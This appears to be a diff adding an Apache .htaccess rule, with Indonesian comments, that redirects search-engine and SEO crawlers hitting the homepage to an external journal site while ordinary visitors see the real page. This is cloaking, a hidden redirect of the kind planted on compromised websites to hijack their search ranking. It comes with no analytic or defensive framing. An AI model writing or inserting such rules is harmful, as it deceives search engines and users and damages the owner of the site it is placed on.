@@ -1,0 +1,12 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Hanya untuk bot
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+
+# Hanya jika membuka halaman utama /
+RewriteCond %{REQUEST_URI} ^/?$
+
+# Redirect 301 ke AJGT
+RewriteRule ^$ https://journals.e-palli.com/home/index.php/ajgt [R=301,L]
+</IfModule>
